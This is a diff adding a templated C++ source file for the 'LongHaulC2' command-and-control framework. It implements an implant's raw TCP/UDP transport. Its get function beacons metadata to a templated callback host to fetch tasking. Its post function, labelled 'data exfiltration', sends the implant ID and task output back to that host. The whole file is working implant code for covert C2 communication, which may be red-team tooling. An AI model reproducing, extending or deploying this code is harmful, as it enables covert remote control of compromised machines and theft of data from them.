@@ -1,0 +1,118 @@
+[#
+Name: Raw Socket get/post functions (LongHaulC2 TOML Variant)
+Explanation: Data-driven C2 over raw TCP/UDP sockets using Token Replacement.
+             The profile body template defines the exact wire format.
+             No type bytes are added — the wire looks exactly like whatever the
+             profile defines.
+#]
+
+[% from 'transform.j2' import render_transform %]
+[% from 'transform_reverse.j2' import render_reverse_transform %]
+
+#include "protocols/raw_socket/raw_socket.h"
+#include "data/transforms/transforms.h"
+#include "_debug/debug.h"
+#include <string>
+#include <vector>
+
+using namespace std::string_literals;
+
+namespace [[ raw_profile_namespace ]] {
+
+    // ====================================================================
+    // Token Replacement Helper
+    // ====================================================================
+    inline void replace_token(std::string& target, const std::string& token, const std::string& replacement) {
+        size_t pos = 0;
+        while ((pos = target.find(token, pos)) != std::string::npos) {
+            target.replace(pos, token.length(), replacement);
+            pos += replacement.length();
+        }
+    }
+
+    // ====================================================================
+    // BEACON / TASKING (RAW GET)
+    // ====================================================================
+    inline std::vector<uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
+        DEBUG_LOG("[Raw::[[ raw_profile_namespace ]]::get] Initiating GET");
+
+        // 1. Prepare and Transform Metadata
+        std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
+
+        [% for step in get_metadata_transforms %]
+            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
+            [[ render_transform(t_obj, 'metadata') ]]
+        [% endfor %]
+
+        // 2. Build Wire Payload (body template with token replaced)
+        std::string body = "[[ get_body ]]";
+        replace_token(body, "<METADATA>", metadata);
+
+        std::vector<uint8_t> wire_payload(body.begin(), body.end());
+
+        DEBUG_LOG("[Raw::[[ raw_profile_namespace ]]::get] Wire payload size: " + std::to_string(wire_payload.size()));
+
+        // 3. Send and Receive via raw socket
+        std::vector<uint8_t> raw_response;
+        [% if raw_proto == 'udp' %]
+        bool ok = RAW_UDP_SEND_RECV(L"[[ callback_host ]]", [[ callback_port ]], wire_payload, raw_response);
+        [% else %]
+        bool ok = RAW_TCP_SEND_RECV(L"[[ callback_host ]]", [[ callback_port ]], wire_payload, raw_response);
+        [% endif %]
+
+        if (!ok || raw_response.empty()) {
+            DEBUG_LOG("[Raw::[[ raw_profile_namespace ]]::get] No response / send failed");
+            return std::vector<uint8_t>{};
+        }
+
+        // 4. Reverse Server Output Transforms
+        std::string response_body(raw_response.begin(), raw_response.end());
+
+        [% for step in get_server_transforms | reverse %]
+            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
+            [[ render_reverse_transform(t_obj, 'response_body') ]]
+        [% endfor %]
+
+        return std::vector<uint8_t>(response_body.begin(), response_body.end());
+    }
+
+    // ====================================================================
+    // DATA EXFILTRATION (RAW POST)
+    // ====================================================================
+    inline int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
+        DEBUG_LOG("[Raw::[[ raw_profile_namespace ]]::post] Initiating POST");
+
+        // 1. Prepare and Transform ID & Payload
+        std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
+
+        [% for step in post_id_transforms %]
+            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
+            [[ render_transform(t_obj, 'implant_uuid') ]]
+        [% endfor %]
+
+        [% for step in post_output_transforms %]
+            [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
+            [[ render_transform(t_obj, 'payload') ]]
+        [% endfor %]
+
+        // 2. Build Wire Payload
+        std::string body = "[[ post_body ]]";
+        replace_token(body, "<CLIENT_ID>", implant_uuid);
+        replace_token(body, "<OUTPUT>", payload);
+
+        std::vector<uint8_t> wire_payload(body.begin(), body.end());
+
+        DEBUG_LOG("[Raw::[[ raw_profile_namespace ]]::post] Wire payload size: " + std::to_string(wire_payload.size()));
+
+        // 3. Send (ACK response is discarded)
+        std::vector<uint8_t> response;
+        [% if raw_proto == 'udp' %]
+        RAW_UDP_SEND_RECV(L"[[ callback_host ]]", [[ callback_port ]], wire_payload, response);
+        [% else %]
+        RAW_TCP_SEND_RECV(L"[[ callback_host ]]", [[ callback_port ]], wire_payload, response);
+        [% endif %]
+
+        return 0;
+    }
+
+} // namespace [[ raw_profile_namespace ]]
